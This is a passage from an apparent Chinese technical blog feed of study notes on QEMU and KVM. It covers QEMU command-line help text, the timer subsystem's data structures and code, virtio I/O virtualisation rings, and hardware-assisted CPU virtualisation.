'txcookie=0x012345678' to specify a txcookie use 'cookie64=on' to set cookie size to 64 bit, otherwise 32 use 'counter=off' to force a 'cut-down' L2TPv3 with no counter use 'pincounter=on' to work around broken counter handling in peer use 'offset=X' to add an extra offset between header and data-netdev socket,id=str[,fd=h][,listen=[host]:port][,connect=host:port] configure a network backend to connect to another network using a socket connection-netdev socket,id=str[,fd=h][,mcast=maddr:port[,localaddr=addr]] configure a network backend to connect to a multicast maddr and port use 'localaddr=addr' to specify the host address to send packets from-netdev socket,id=str[,fd=h][,udp=host:port][,localaddr=host:port] configure a network backend to connect to another network using an UDP tunnel-netdev vhost-user,id=str,chardev=dev[,vhostforce=on|off] configure a vhost-user network, backed by a chardev 'dev'-netdev hubport,id=str,hubid=n configure a hub port on QEMU VLAN 'n'-net nic[,vlan=n][,macaddr=mac][,model=type][,name=str][,addr=str][,vectors=v] old way to create a new NIC and connect it to VLAN 'n' (use the '-device devtype,netdev=str' option if possible instead)-net dump[,vlan=n][,file=f][,len=n] dump traffic on vlan 'n' to file 'f' (max n bytes per packet)-net none use it alone to have zero network devices. If no -net option is provided, the default is '-net nic -net user'-net [user|tap|bridge|socket][,vlan=n][,option][,option][,...] old way to initialize a host network interface (use the -netdev option if possible instead)Character device options:-chardev null,id=id[,mux=on|off]-chardev socket,id=id[,host=host],port=port[,to=to][,ipv4][,ipv6][,nodelay][,reconnect=seconds] [,server][,nowait][,telnet][,reconnect=seconds][,mux=on|off] (tcp)-chardev socket,id=id,path=path[,server][,nowait][,telnet][,reconnect=seconds][,mux=on|off] (unix)-chardev udp,id=id[,host=host],port=port[,localaddr=localaddr] [,localport=localport][,ipv4][,ipv6][,mux=on|off]-chardev msmouse,id=id[,mux=on|off]-chardev vc,id=id[[,width=width][,height=height]][[,cols=cols][,rows=rows]] [,mux=on|off]-chardev ringbuf,id=id[,size=size]-chardev file,id=id,path=path[,mux=on|off]-chardev pipe,id=id,path=path[,mux=on|off]-chardev pty,id=id[,mux=on|off]-chardev stdio,id=id[,mux=on|off][,signal=on|off]-chardev serial,id=id,path=path[,mux=on|off]-chardev tty,id=id,path=path[,mux=on|off]-chardev parallel,id=id,path=path[,mux=on|off]-chardev parport,id=id,path=path[,mux=on|off]Device URL Syntax:-iscsi [user=user][,password=password] [,header-digest=CRC32C|CR32C-NONE|NONE-CRC32C|NONE [,initiator-name=initiator-iqn][,id=target-iqn] [,timeout=timeout] iSCSI session parametersBluetooth(R) options:-bt hci,null dumb bluetooth HCI - doesn't respond to commands-bt hci,host[:id] use host's HCI with the given name-bt hci[,vlan=n] emulate a standard HCI in virtual scatternet 'n'-bt vhci[,vlan=n] add host computer to virtual scatternet 'n' using VHCI-bt device:dev[,vlan=n] emulate a bluetooth device 'dev' in scatternet 'n'TPM device options:-tpmdev passthrough,id=id[,path=path][,cancel-path=path] use path to provide path to a character device; default is /dev/tpm0 use cancel-path to provide path to TPM's cancel sysfs entry; if not provided it will be searched for in /sys/class/misc/tpm?/deviceLinux/Multiboot boot specific:-kernel bzImage use 'bzImage' as kernel image-append cmdline use 'cmdline' as kernel command line-initrd file use 'file' as initial ram disk-dtb file use 'file' as device tree imageDebug/Expert options:-fw_cfg [name=]&lt;name&gt;,file=&lt;file&gt; add named fw_cfg entry from file-serial dev redirect the serial port to char device 'dev'-parallel dev redirect the parallel port to char device 'dev'-monitor dev redirect the monitor to char device 'dev'-qmp dev like -monitor but opens in 'control' mode-qmp-pretty dev like -qmp but uses pretty JSON formatting-mon [chardev=]name[,mode=readline|control][,default]-debugcon dev redirect the debug console to char device 'dev'-pidfile file write PID to 'file'-singlestep always run in singlestep mode-S freeze CPU at startup (use 'c' to start execution)-realtime [mlock=on|off] run qemu with realtime features mlock=on|off controls mlock support (default: on)-gdb dev wait for gdb connection on 'dev'-s shorthand for -gdb tcp::1234-d item1,... enable logging of specified items (use '-d help' for a list of log items)-D logfile output log to logfile (default stderr)-L path set the directory for the BIOS, VGA BIOS and keymaps-bios file set the filename for the BIOS-enable-kvm enable KVM full virtualization support-xen-domid id specify xen guest domain id-xen-create create domain using xen hypercalls, bypassing xend warning: should not be used when xend is in use-xen-attach attach to existing xen domain xend will use this when starting QEMU-no-reboot exit instead of rebooting-no-shutdown stop before shutdown-loadvm [tag|id] start right away with a saved state (loadvm in monitor)-daemonize daemonize QEMU after initializing-option-rom rom load a file, rom, into the option ROM space-rtc [base=utc|localtime|date][,clock=host|rt|vm][,driftfix=none|slew] set the RTC base and clock, enable drift fix for clock ticks (x86 only)-icount [shift=N|auto][,align=on|off][,sleep=no] enable virtual instruction counter with 2^N clock ticks per instruction, enable aligning the host and virtual clocks or disable real time cpu sleeping-watchdog model enable virtual hardware watchdog [default=none]-watchdog-action reset|shutdown|poweroff|pause|debug|none action when watchdog fires [default=reset]-echr chr set terminal escape character instead of ctrl-a-virtioconsole c set virtio console-show-cursor show cursor-tb-size n set TB size-incoming tcp:[host]:port[,to=maxport][,ipv4][,ipv6]-incoming rdma:host:port[,ipv4][,ipv6]-incoming unix:socketpath prepare for incoming migration, listen on specified protocol and socket address-incoming fd:fd-incoming exec:cmdline accept incoming migration on given file descriptor or from given external command-incoming defer wait for the URI to be specified via migrate_incoming-nodefaults don't create default devices-chroot dir chroot to dir just before starting the VM-runas user change to user id user just before starting the VM-sandbox &lt;arg&gt; Enable seccomp mode 2 system call filter (default 'off').-readconfig &lt;file&gt;-writeconfig &lt;file&gt; read/write config file-nodefconfig do not load default config files at startup-no-user-config do not load user-provided config files at startup-trace [events=&lt;file&gt;][,file=&lt;file&gt;] specify tracing options-enable-fips enable FIPS 140-2 compliance-msg timestamp[=on|off] change the format of messages on|off controls leading timestamps (default:on)-dump-vmstate &lt;file&gt; Output vmstate information in JSON format to file. Use the scripts/vmstate-static-checker.py file to check for possible regressions in migration code by comparing two such vmstate dumps.Generic object creation-object TYPENAME[,PROP1=VALUE1,...] create a new object of type TYPENAME setting properties in the order they are specified. Note that the 'id' property must be set. These objects are placed in the '/objects' path.During emulation, the following keys are useful:ctrl-alt-f toggle full screenctrl-alt-n switch to virtual console 'n'ctrl-alt toggle mouse and keyboard grabWhen using -nographic, press 'ctrl-a h' to get some help. Qemu的定时器qemu中所有的与时间相关的模块都由timer.h和qemu-timer.c文件实现，时钟的功能主要有二：记录时间和处理定时任务。 基本数据结构QEMUClock Type qemuclock一共有四种类型，分别是：QEMU_CLOCK_REALTIME、QEMU_CLOCK_VIRTUAL、QEMU_CLOCK_HOST和QEMU_CLOCK_VIRTUAL_RT： QEMU_CLOCK_REALTIME不受虚拟系统的影响，随时间流逝而累加计数 QEMU_CLOCK_VIRTUAL虚拟时钟，记录虚拟系统的时间滴答 QEMU_CLOCK_HOST这个类似墙上时钟，修改宿主机系统时间会改变这个时间 QEMU_CLOCK_VIRTUAL_RT在非icount模式下和QEMU_CLOCK_VIRTUAL，在icount模式下于QEMU_CLOCK_VIRTUAL不同的是在虚拟CPU休眠的时候该值也会累加 12345678//timer.htypedef enum &#123; QEMU_CLOCK_REALTIME = 0, QEMU_CLOCK_VIRTUAL = 1, QEMU_CLOCK_HOST = 2, QEMU_CLOCK_VIRTUAL_RT = 3, QEMU_CLOCK_MAX&#125; QEMUClockType; QEMUClock Struct 12345678910typedef struct QEMUClock &#123; /* We rely on BQL to protect the timerlists */ QLIST_HEAD(, QEMUTimerList) timerlists;//QEMUTimerList用于存放定时器链表,注意定时器为每个滴答都会回调 NotifierList reset_notifiers;//用于时钟被重置时调用 int64_t last;//最后一次查询时间 QEMUClockType type;//时钟类型 bool enabled;//表示时钟是否被禁止&#125; QEMUClock; QEMUTimer Struct 123456789struct QEMUTimer &#123; int64_t expire_time; /* in nanoseconds */ //到期时间,绝对时间,单位ns QEMUTimerList *timer_list; //所属的QEMUTimerList QEMUTimerCB *cb; //定时器的到期回调函数 void *opaque; //回调函数的参数 QEMUTimer *next; //下一个定时器 int attributes; int scale;&#125;; QEMUTimerList Struct 123456789101112131415161718/* A QEMUTimerList is a list of timers attached to a clock. More * than one QEMUTimerList can be attached to each clock, for instance * used by different AioContexts / threads. Each clock also has * a list of the QEMUTimerLists associated with it, in order that * reenabling the clock can call all the notifiers. */struct QEMUTimerList &#123; QEMUClock *clock; //所属的QEMUClock QemuMutex active_timers_lock; //用于修改active_timers链表的锁 QEMUTimer *active_timers; //timer链表 QLIST_ENTRY(QEMUTimerList) list; QEMUTimerListNotifyCB *notify_cb; //该队列有定时器到期后的回调函数 void *notify_opaque; //回调函数的参数 /* lightweight method to mark the end of timerlist's running */ QemuEvent timers_done_ev;&#125;; 初始化流程123456789101112// util/qemu-timer.cvoid init_clocks(QEMUTimerListNotifyCB *notify_cb) //初始化函数入口&#123; QEMUClockType type; for (type = 0; type &lt; QEMU_CLOCK_MAX; type++) &#123; //#define QEMU_CLOCK_MAX 4 qemu_clock_init(type, notify_cb); //初始化4个时钟 &#125;#ifdef CONFIG_PRCTL_PR_SET_TIMERSLACK prctl(PR_SET_TIMERSLACK, 1, 0, 0, 0); //设置线程的定时器计数器为1#endif&#125; 继续分析： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// util/qemu-timer.cstatic void qemu_clock_init(QEMUClockType type, QEMUTimerListNotifyCB *notify_cb)&#123; QEMUClock *clock = qemu_clock_ptr(type); /* Assert that the clock of type TYPE has not been initialized yet. */ assert(main_loop_tlg.tl[type] == NULL); clock-&gt;type = type; clock-&gt;enabled = (type == QEMU_CLOCK_VIRTUAL ? false : true); clock-&gt;last = INT64_MIN; QLIST_INIT(&amp;clock-&gt;timerlists); notifier_list_init(&amp;clock-&gt;reset_notifiers); main_loop_tlg.tl[type] = timerlist_new(type, notify_cb, NULL);&#125;//四个时钟使用类型作为索引放在qemu_clocks数组中/** * qemu_clock_ptr: * @type: type of clock * * Translate a clock type into a pointer to QEMUClock object. * * Returns: a pointer to the QEMUClock object */static inline QEMUClock *qemu_clock_ptr(QEMUClockType type)&#123; return &amp;qemu_clocks[type];&#125;//用于初始化时钟的定时器链表()QEMUTimerList *timerlist_new(QEMUClockType type, QEMUTimerListNotifyCB *cb, void *opaque)&#123; QEMUTimerList *timer_list; QEMUClock *clock = qemu_clock_ptr(type); timer_list = g_malloc0(sizeof(QEMUTimerList)); qemu_event_init(&amp;timer_list-&gt;timers_done_ev, true); timer_list-&gt;clock = clock; timer_list-&gt;notify_cb = cb; timer_list-&gt;notify_opaque = opaque; qemu_mutex_init(&amp;timer_list-&gt;active_timers_lock); QLIST_INSERT_HEAD(&amp;clock-&gt;timerlists, timer_list, list); return timer_list;&#125; timerlist_new函数其实就是把一个定时器回调函数注册到了这个时钟的timer队列里面，由此可见主线程的定时器回调函数为qemu_timer-&gt;notify_cb，参数为qemu_timer-&gt;notify_opaque。另外主线程的定时器不但可以从定时器结构QEMUClock.timer_list中索引，还可以从main_loop_tlg中索引。这样定时器就初始化工作完成了。 计时方法qemu_clock_get_ns是用来获取时钟上的时间的。 123456789101112131415161718192021222324252627int64_t qemu_clock_get_ns(QEMUClockType type)&#123; int64_t now, last; QEMUClock *clock = qemu_clock_ptr(type); switch (type) &#123; case QEMU_CLOCK_REALTIME: return get_clock(); default: case QEMU_CLOCK_VIRTUAL: if (use_icount) &#123; return cpu_get_icount(); &#125; else &#123; return cpu_get_clock(); &#125; case QEMU_CLOCK_HOST: now = REPLAY_CLOCK(REPLAY_CLOCK_HOST, get_clock_realtime()); last = clock-&gt;last; clock-&gt;last = now; if (now &lt; last || now &gt; (last + get_max_clock_jump())) &#123; notifier_list_notify(&amp;clock-&gt;reset_notifiers, &amp;now); &#125; return now; case QEMU_CLOCK_VIRTUAL_RT: return REPLAY_CLOCK(REPLAY_CLOCK_VIRTUAL_RT, cpu_get_clock()); &#125;&#125; 对于每种时钟使用不同时间获取函数，先来看QEMU_CLOCK_REALTIME， 这是一个不受vCPU影响的累加计数器，get_clock其实是使用clock_gettime(CLOCK_MONOTONIC, &amp;ts)实现的，所以是获取的主机开机后经过的相对时间。 QEMU_CLOCK_VIRTUAL是从vCPU获取的时间或者icount。QEMU_CLOCK_HOST使用timeofday函数获取的真实时间，这是一个绝对时间。QEMU_CLOCK_VIRTUAL_RT则获取vCPU时间。 参考https://blog.csdn.net/woai110120130/article/details/99689645 https://rickylss.github.io/qemu/2019/05/20/qemu-timer/]]></content>
      <categories>
        <category>Qemu&amp;KVM学习</category>
      </categories>
      <tags>
        <tag>summary</tag>
        <tag>Qemu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Qemu学习-I/O虚拟化]]></title>
    <url>%2F2020%2F08%2F06%2FQemu%E5%AD%A6%E4%B9%A0%E2%80%94IO%E8%99%9A%E6%8B%9F%E5%8C%96%2F</url>
    <content type="text"><![CDATA[I/O虚拟化在Qemu/kvm中，Guest OS可以使用的设备大致可分为三类： 模拟设备：完全由Qemu纯软件模拟的设备，也就是全虚拟化I/O设备。 Virtio设备：实现Virtio API的半虚拟化设备，也就是半虚拟化I/O设备。 PCI设备直接分配(PCI device assignment)。 全虚拟化I/Okvm在虚拟机中只负责有vCPU和内存管理，I/O设备则默认全部交由Qemu用纯软件的方式模拟完成，包括鼠标，键盘，显卡，硬盘，网卡等。 具体原理如下： Guest OS的device drivers programe发起I/O请求操作请求。 KVM模块中的I/O操作捕获代码拦截这次I/O请求。 经过处理后将本次I/O请求的信息放到I/O共享页(sharing page，并通知用户空间的QEMU程序。 QEMU程序获得I/O操作的具体信息之后，交由硬件模拟代码来模拟出本次I/O操作。 完成之后，QEMU将结果放回I/O共享页，并通知KMV模块中的I/O操作捕获代码。 KVM模块的捕获代码读取I/O共享页中的操作结果，并把结果放回客户机。 半虚拟化I/O(Virtio框架)简述先说结论，通过之前的学习，我们知道kvm作为User mode和Guest mode之前的桥梁，关系如下图： 这就导致I/O操作比较繁琐，而Virtio框架使Guest OS可以直接与Host/User mode(Qemu)的I/O模块通信，无须kvm中转，从而提高I/O性能，使virtio设备性能趋近于native设备。 其需要在Guest OS中提前安装Front-end，Qemu中实现Back-end，Front-end作为一个内核模块/设备驱动位于Guest OS中，其负责接收客户机用户态程序的I/O请求，并将I/O请求传输给Back-end，Back-end作为一个模拟设备位于Qemu中，其负责接收Front-end的I/O请求，并通过真实的物理设备执行I/O操作。 virtio_ringFront-end和Back-end是通过vring进行通信的，Guest OS前端驱动程序通过virtqueue与hypervisor交互，实现数据的共享。对于I/O，Guest OS提供一个或多个表示请求的缓冲池。 vring是virtqueue 的具体实现方式，在host和guest操作系统之间作内存映射，针对vring会有相应的描述符表格进行描述。virtio_ring(实现虚拟队列的环形缓冲区)是virtio传输机制的实现，vring 引入ring buffers(环形缓冲区)来作为数据传输的载体。 从结构上看，virtio_ring包含3部分： Descriptor Table Available Ring Used Ring Descriptor Table(描述符数组)描述符数组(descriptor table)用于存储真正的buffer，每个描述符都是一个对buffer的描述，包含一个address/length的配对、下个buffer的指针、两个标志位(下个buffer是否有效和当前buffer是可读/写)。每个buffer在内部被表示为一个散集列表(scatter-gather)，列表中的每个条目表示一个地址和一个长度。每个条目的结构体为struct vring_desc，desc table数组大小为Queue Size。 123456789101112/* include/standard-headers/linux/virtio_ring.h *//* Virtio ring descriptors: 16 bytes. These can chain together via "next". */struct vring_desc &#123; /* Address (guest-physical). */ __virtio64 addr; /* Length. */ __virtio32 len; /* The flags as indicated above. */ __virtio16 flags; /* We chain unused descriptors via this, too */ __virtio16 next;&#125;; Available ringAvailable ring用于Guest端表示哪些描述符链(descriptor chain)当前是可用的。Available ring由driver写，device读取。 123456/* include/standard-headers/linux/virtio_ring.h */struct vring_avail &#123; __virtio16 flags; __virtio16 idx; __virtio16 ring[];&#125;; flags：用于指示Host当它处理完buffer，将Descriptor index写入Used Ring之后，是否通过注入中断通知Guest。 如果flags设置为0，Host每处理完一次buffer就会中断通知Guest。 如果flags为1，不通知Guest。 如果VIRTIO_F_EVENT_IDX该特性开启，那么flags的意义将会改变，Guest必须把flags设置为0，然后通过used_event机制实现通知。 idx : 指示Guest下一次添加buffer时，在ring[]中取的位置，从0开始。ring[]：是一个大小为Queue Size的数组，entry是存放Descriptor Table Chain的head。used_event用作Event方式通知机制，此值用于控制Guest的virtqueue数据发送速度，是Qemu处理avail ring后的last_avail_idx。 Used ringused ring表示device记录哪些描述符链已经使用。used ring由device写，driver读取。 1234567891011121314/* include/standard-headers/linux/virtio_ring.h */struct vring_used &#123; __virtio16 flags; __virtio16 idx; struct vring_used_elem ring[];&#125;;/* uint32_t is used here for ids for padding reasons. */struct vring_used_elem &#123; /* Index of start of used descriptor chain. */ __virtio32 id; /* Total length of the descriptor chain which was used (written to) */ __virtio32 len;&#125;; 每个used ring中条目struct virtq_used_elem中id指定了在descriptor chain中的head条目，而len指定了要写入buffer的字节数。struct virtq_used 中的flags用于指示Guest当它添加完buffer，将Descriptor index写入Avail Ring之后，是否发送notification通知Host。 如果flags设置为0，Guest每增加一次buffer就会通知Host。 如果flags为1，不通知Host。 当 VIRTIO_F_EVENT_IDX 特性开启时，flags必须被设置成0，Guest使用avail_event方式通知Host。idx 用于指示Host下一次处理的buffer在Used Ring所的位置。ring[]：是一个大小为Queue Size的数组，entry是存放Descriptor Table Chain的head。avail_event用作Event方式通知机制。 12345/* include/standard-headers/linux/virtio_ring.h *//* We publish the used event index at the end of the available ring, and vice * versa. They are at the end for backwards compatibility. */#define vring_used_event(vr) ((vr)-&gt;avail-&gt;ring[(vr)-&gt;num])#define vring_avail_event(vr) (*(__virtio16 *)&amp;(vr)-&gt;used-&gt;ring[(vr)-&gt;num]) vring的实现virtqueue_pop()，virtqueue_push()，virtqueue_fill()，virtqueue_flush()函数代码分析 to do… virtio数据传输https://blog.csdn.net/huang987246510/article/details/103708461#_2 驱动程序代码flowvirtio有分为guest中的前端程序和Qemu中的后端程序。virtio中有五种前端程序： virtio-blk(块设备驱动程序):/hw/block/virtio-blk.c virtio-net(网络设备驱动程序):/hw/net/virtio-net.c virtio-pci(PCI设备驱动程序):/hw/virtio/virtio-pci.c virtio-balloon(气球驱动程序，动态管理客户机内存使用情况):/hw/virtio/virtio-balloon.c virtio-console(控制台驱动程序):/hw/char/virtio-console.c 其继续往下调用为Transport过程/hw/virtio/virtio.c，然后进入Back-end。 Guest OS中，在不使用virtio设备的时候，这些驱动不会被加载。只有在使用某个virtio设备的时候，对应的驱动才会被加载。每个前端驱动器具有在管理程序中的相应的后端的驱动程序。 virtio的flow：guest =&gt; qemu =&gt; host kernel =&gt; hw。 参考https://www.cnblogs.com/sammyliu/p/4543657.html https://juniorprincewang.github.io/2018/03/01/virtio%E5%AD%A6%E4%B9%A0/]]></content>
      <categories>
        <category>Qemu&amp;KVM学习</category>
      </categories>
      <tags>
        <tag>summary</tag>
        <tag>Qemu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Qemu学习-CPU虚拟化]]></title>
    <url>%2F2020%2F08%2F04%2FQemu%E5%AD%A6%E4%B9%A0%E2%80%94CPU%E8%99%9A%E6%8B%9F%E5%8C%96%2F</url>
    <content type="text"><![CDATA[CPU虚拟化虚拟CPU带来的问题我们都知道x86处理器提供ring0~ring3四个特权级别给操作系统和应用程序来访问硬件，ring0权限最高，ring3权限最低： 操作系统（内核）需要直接访问硬件和内存，因此它的代码需要运行在最高运行级别ring0上，这样它可以使用特权指令，控制中断、修改页表、访问设备等等。 应用程序的代码运行在最低运行级别上ring3上，不能做受控操作。如果要做，比如要访问磁盘，写文件，那就要通过执行系统调用，执行系统调用的时候，CPU的运行级别会发生从ring3到ring0的切换，并跳转到系统调用对应的内核代码位置执行，这样内核就为你完成了设备访问，完成之后再从ring0返回ring3。这个过程也称作用户态和内核态的切换。 虚拟CPU在这里遇到一个难题，因为Host OS是工作在ring0的，Guest OS就无法也在ring0了，但是Guest OS本身不知道这一点，以前执行访问设备等特权指令，现在还是执行特权指令，但是没有执行权限肯定会出错。 虚拟机怎么通过VMM/Hypervisor实现Guest CPU对硬件的访问，根据其原理不同有三种实现技术： 全虚拟化/Full-Virtualization 半虚拟化/Para-Virtualization 硬件辅助的全虚拟化 基于二进制翻译的全虚拟化客户操作系统运行在ring1，它在执行特权指令时，会触发CPU异常(Exception)，然后VMM捕获这个异常，在异常里面做翻译，模拟，最后返回到客户操作系统内，客户操作系统认为自己的特权指令工作正常，继续运行。但是这个性能损耗非常的大，简单的一条指令，本来执行完结束，现在却要通过复杂的异常处理过程。 异常Exception(内中断)，中断Interrupt(外中断)，陷阱Trap(软中断)的区别： 结构图，这里的VMM可以理解为kvm： Guest OS =&gt; Hardware Exception =&gt; VMM exception handler function(handle+emulate privileged ins) =&gt; Guest OS： 半虚拟化半虚拟化的思想是：修改操作系统内核，替换掉不能虚拟化的指令，通过超级调用(hypercall)直接和底层的虚拟化层Hypervisor来通讯，Hypervisor同时也提供了超级调用接口来满足其他关键内核操作，比如内存管理、中断和时间保持。 这种做法省去了全虚拟化中的捕获和模拟，大大提高了效率。所以像Xen这种半虚拟化技术，客户机操作系统都是有一个专门的定制内核版本，和x86、mips、arm这些内核版本等价。这样以来，就不会有捕获异常、翻译、模拟的过程了，性能损耗非常低。这就是Xen这种半虚拟化架构的优势。这也是为什么Xen只支持虚拟化Linux，无法虚拟化windows原因，因为微软不改代码。 硬件辅助的全虚拟化2005年后，CPU厂商Intel和AMD开始支持虚拟化了。Intel引入了Intel-VT(Virtualization Technology)技术。 这种CPU，有VMX root operation和VMX non-root operation两种模式，两种模式都支持ring0~ring3共4个运行级别。这样，VMM可以运行在VMX root operation模式下，Guest OS运行在VMX non-root operation模式下。 而且两种操作模式可以互相转换。运行在VMX root operation模式下的VMM通过显式调用VMLAUNCH或VMRESUME指令切换到VMX non-root operation模式，硬件自动加载Guest OS的上下文，于是Guest OS获得运行，这种转换称为VM entry。Guest OS运行过程中遇到需要VMM处理的事件，例如外部中断或缺页异常，或者主动调用VMCALL指令调用VMM的服务的时候(与系统调用类似)，硬件自动挂起 Guest OS，切换到VMX root operation模式，恢复VMM的运行，这种转换称为VM exit。VMX root operation模式下软件的行为与在没有VT-x技术的处理器上的行为基本一致；而VMX non-root operation模式则有很大不同，最主要的区别是此时运行某些指令或遇到某些事件时，发生VM exit。 也就说，硬件这层就做了些区分，这样全虚拟化下，那些靠捕获异常-翻译-模拟的实现就不需要了。而且CPU厂商，支持虚拟化的力度越来越大，靠硬件辅助的全虚拟化技术的性能逐渐逼近半虚拟化，再加上全虚拟化不需要修改客户操作系统这一优势，全虚拟化技术应该是未来的发展趋势。 利用二进制翻译的全虚拟化 硬件辅助虚拟化 操作系统协助/半虚拟化 实现技术 BT和直接执行 遇到特权指令转到root模式执行 Hypercall 客户操作系统修改/兼容性 无需修改客户操作系统，最佳兼容性 无需修改客户操作系统，最佳兼容性 客户操作系统需要修改来支持hypercall，因此它不能运行在物理硬件本身或其他的hypervisor上，兼容性差，不支持Windows 性能 差 全虚拟化下，CPU需要在两种模式之间切换，带来性能开销；但是，其性能在逐渐逼近半虚拟化。 好。半虚拟化下CPU性能开销几乎为0，虚机的性能接近于物理机。 应用厂商 VMware Workstation/QEMU/Virtual PC VMware ESXi/Microsoft Hyper-V/Xen 3.0/KVM Xen KVM的CPU虚拟化vCPU概述qemu-kvm通过对/dev/kvm的一系列ioctl命令来控制虚拟机和监视虚拟机的状态，例如： 1234int kvmfd = open("/dev/kvm", O_RDWR|O_LARGEFILE);ret = ioctl(kvmfd, KVM_GET_API_VERSION, 0);int vmfd = ioctl(kvmfd, KVM_CREATE_VM, 0); int vcpufd = ioctl(vmfd, KVM_CREATE_VCPU, 0); 一个KVM虚拟机即一个Linuxqemu-kvm进程，与其他Linux进程一样被Linux进程调度器调度。 KVM虚拟机包括虚拟内存、虚拟CPU和虚机 I/O设备，其中，内存和CPU的虚拟化由KVM内核模块负责实现，I/O设备的虚拟化由Qwmu负责实现。 KVM户机系统的内存是qemu-kvm进程的地址空间的一部分。 KVM虚拟机的vCPU作为线程运行在qemu-kvm进程的上下文中。 vCPU、Qemu进程、Linux进程调度和物理CPU之间的逻辑关系： 通过上面的学习已经得知kvm属于硬件辅助的全虚拟化，由于支持虚拟化的CPU中都增加了新的功能。以Intel-VT技术为例，它增加了两种运行模式：VMX root模式和VMX non-root模式。通常来讲，Host OS和VMM运行在VMX root模式中，Guest OS及其应用运行在 VMX non-root模式中。因为两个模式都由各自的ring0~ring3，因此，客户机可以运行在它所需要的ring中(OS运行在ring0，应用运行在ring3中)，VMM也运行在其需要的ring中(对KVM来说，QEMU运行在ring3，KVM运行在ring0)。CPU在两种模式之间的切换称为VMX切换。从root mode进入non-root mode，称为VM entry；从non-root mode进入root mode，称为VM exit。可见，CPU受控制地在两种模式之间切换，轮流执行VMM code和Guest OS code。 对KVM虚拟机来说，运行在root mode下的VMM在需要执行Guest OS指令时执行VMLAUNCH/VMRESUME指令将CPU转换到non-root mode，开始执行客户机代码，即VM entry过程；在Guest OS需要退出non-root mode时(主动调用VMCALL指令或者遇到外中断或者遇到缺页等异常)，CPU自动切换到root mode，即VM exit过程。可见，KVM 客户机代码是受VMM控制直接运行在物理CPU上的。Qemu只是通过KVM控制虚机的代码被CPU执行，但是它们本身并不执行其代码。也就是说，CPU并没有真正的被虚拟化成虚拟的CPU给客户机使用。 几个概念： socket：颗，插入CPU的个数。 core：核，每个CPU中的物理内核。 thread：超线程，通常来说，一个CPU core只提供一个thread，这时客户机就只看到一个CPU；但是，超线程技术实现了CPU核的虚拟化，一个核被虚拟化出多个逻辑CPU，可以同时运行多个线程。 所以一个kvm虚拟机的vCPU数目为thread*core*socket，例如-smp 5,sockets=5,cores=1,threads=1，所以vCPU数目为5，vCPU作为 QEMU线程被Linux作为普通的线程/轻量级进程调度到物理的CPU核上。(关于-smp：-smp用法 Guest模式一个普通的Linux内核有两种执行模式：内核模式和用户模式。为了支持带有虚拟化功能的CPU，KVM向Linux内核增加了第三种模式即客户机模式Guest，该模式对应于CPU的VMMX non-root mode。 KVM内核模块作为User mode和Guest mode之间的桥梁： User mode中的Qemu-kvm会通过ioctl命令来运行虚拟机。 KVM收到该请求后，它先做一些准备工作，比如将vCPU上下文加载到VMCS(virtual machine control structure)等，然后驱动 CPU进入VMX non-root模式，开始执行客户机代码。 三种模式的分工为： Guest模式：执行客户机系统非I/O代码，并在需要的时候驱动CPU退出该模式。 Kernel模式：负责将CPU切换到Guest mode执行Guest OS代码，并在CPU退出Guest mode时回到Kenerl模式，将客户机的I/O请求转发给User模式让Qemu完成。 User模式：用ioctl(/dev/kvm)与kvm交互，代替客户机系统执行I/O操作。 Qemu-KVM相比原生Qemu的改动： 原生的Qemu通过指令翻译实现CPU的完全虚拟化，但是修改后的Qemu-KVM会调用ioctl命令来调用KVM模块。 原生的Qemu是单线程实现，Qemu-KVM是多线程实现。 主机Linux将一个虚拟视作一个Qemu进程，该进程包括下面几种线程： I/O线程用于管理模拟设备。 vCPU线程用于运行Guest代码。 其它线程，比如处理event loop，offloaded tasks等的线程。 参考https://www.cnblogs.com/sammyliu/p/4543597.html https://www.slideshare.net/HwanjuKim/3cpu-virtualization-and-scheduling https://www.cnblogs.com/popsuper1982/p/3815398.html]]></content>
      <categories>
        <category>Qemu&amp;KVM学习</category>
      </categories>
      <tags>
        <tag>summary</tag>
        <tag>Qemu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Qemu学习-虚拟化初探]]></title>
    <url>%2F2020%2F08%2F01%2FQemu%E5%AD%A6%E4%B9%A0%E2%80%94%E8%99%9A%E6%8B%9F%E5%8C%96%E5%88%9D%E6%8E%A2%2F</url>
    <content type="text"><![CDATA[Qemu与Kvm KVM全称是基于内核的虚拟机(Kernel-based Virtual Machine)，它是Linux 的一个内核模块，该内核模块使得Linux变成了一个 Hypervisor/VMM： 它由Quramnet开发，该公司于 2008年被Red Hat收购。 它支持x86(32 and 64 位), s390, Powerpc 等CPU。 它从Linux 2.6.20起就作为一模块被包含在Linux内核中。 它需要支持虚拟化扩展的CPU。 它是完全开源的：官网。 KVM是基于虚拟化扩展(Intel VT或者AMD-V)的X86硬件的开源的Linux原生的全虚拟化解决方案。KVM中，虚拟机被实现为常规的 Linux进程，由标准Linux调度程序进行调度；虚机的每个虚拟CPU被实现为一个常规的Linux线程。这使得KMV能够使用Linux内核的已有功能。 需要注意理解的是，KVM本身不执行任何硬件模拟，需要用户空间程序通过/dev/kvm接口设置一个客户机虚拟服务器的地址空间，向它提供模拟I/O，并将它的视频显示映射回宿主的显示屏。目前这个应用程序正是众所周知的QEMU。 Linux上的用户空间、内核空间和虚拟机的简易架构图(我自己画的，只代表简易结构，没画细节部分)： Guest：客户机系统，包括CPU(vCPU)、内存、驱动(Console、NIC、I/O设备驱动等），被KVM置于一种受限制的CPU模式下运行。 KVM：运行在内核空间，提供CPU和内存的虚级化，以及客户机的I/O拦截。Guest的I/O被KVM拦截后，交给QEMU处理。 QEMU：修改过的被KVM虚机使用的QEMU代码，运行在用户空间，提供硬件I/O虚拟化，通过ioctl与/dev/kvm设备和KVM交互。 现代硬件的支持现代CPU本身实现了对特殊指令的截获和重定向的硬件支持，甚至新硬件会提供额外的资源来帮助软件实现对关键硬件资源的虚拟化从而提高性能，以X86平台为例： 支持虚拟化技术的CPU带有特别优化过的指令集来控制虚拟化过程。通过这些指令集，VMM很容易将客户机置于一种受限制的模式下运行，一旦客户机试图访问物理资源，硬件会暂停客户机运行，将控制权交回给VMM处理。 VMM还可以利用硬件的虚级化增强机制，将客户机在受限模式下对一些特定资源的访问，完全由硬件重定向到VMM指定的虚拟资源，整个过程不需要暂停客户机的运行和VMM的参与。 由于虚拟化硬件提供全新的架构，支持操作系统直接在上面运行，无需进行二进制转换，减少了相关的性能开销，极大简化了VMM的设计，使得VMM性能更加强大。从2005年开始，Intel在其处理器产品线中推广Intel 